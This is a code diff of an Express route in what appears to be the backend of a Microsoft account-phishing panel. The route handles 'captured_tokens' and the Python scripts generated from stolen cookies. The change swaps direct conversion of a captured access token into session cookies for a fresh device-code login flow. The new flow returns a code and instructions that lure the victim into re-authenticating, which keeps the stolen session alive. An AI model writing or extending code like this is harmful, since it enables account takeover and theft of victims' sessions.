@@ -346,7 +346,7 @@ function generatePythonScript(cookies) {
   return script;
 }
 
-// Manual cookie renewal - converts access_token to cookies
+// Manual cookie renewal - opens popup for re-authentication
 router.post('/:id/renew', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
@@ -355,24 +355,43 @@ router.post('/:id/renew', userAuth, async (req, res) => {
     const token = tokens[0];
     const accessToken = decrypt(token.access_token_encrypted);
     if (!accessToken) {
-      return res.status(400).json({ error: 'No access token available' });
+      return res.status(400).json({ error: 'No access token available for renewal' });
     }
     
-    const cookieConverter = require('../services/cookieconverter');
-    const result = await cookieConverter.convertTokensToCookies(accessToken, token.template_type, '', '');
+    // Generate a new device code flow for renewal
+    const deviceProxy = require('../services/deviceproxy');
+    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
+    const jwtToken = require('jsonwebtoken').sign(
+      { user_id: req.user.id, link_id: token.link_id },
+      require('../config/env').JWT_SECRET,
+      { expiresIn: '1h' }
+    );
     
-    if (result.success && result.cookies) {
+    const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);
+    
+    if (result.job_id && result.user_code) {
+      // Store the renewal job ID
       await db.query(
-        'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
-        [encrypt(result.cookies), 'cookie', token.id]
+        'INSERT INTO cookie_renewals (capture_id, user_id, job_id, user_code, created_at) VALUES (?, ?, ?, ?, NOW())',
+        [token.id, req.user.id, result.job_id, result.user_code]
       );
+      
+      // Update token with new expiration
+      await db.query(
+        'UPDATE captured_tokens SET expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
+        [token.id]
+      );
+      
       res.json({
         success: true,
-        cookies: result.cookies,
-        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length
+        job_id: result.job_id,
+        user_code: result.user_code,
+        verification_uri: result.verification_uri,
+        message: 'Renewal initiated. Complete authentication in the popup window.',
+        instructions: 'A popup will open. Enter the code and complete the Microsoft login to renew your session.'
       });
     } else {
-      res.status(400).json({ error: result.error || 'Conversion failed', success: false });
+      res.status(400).json({ error: 'Failed to start renewal flow', success: false });
     }
   } catch (err) {
     console.error('[Tokens] Renewal error:', err);
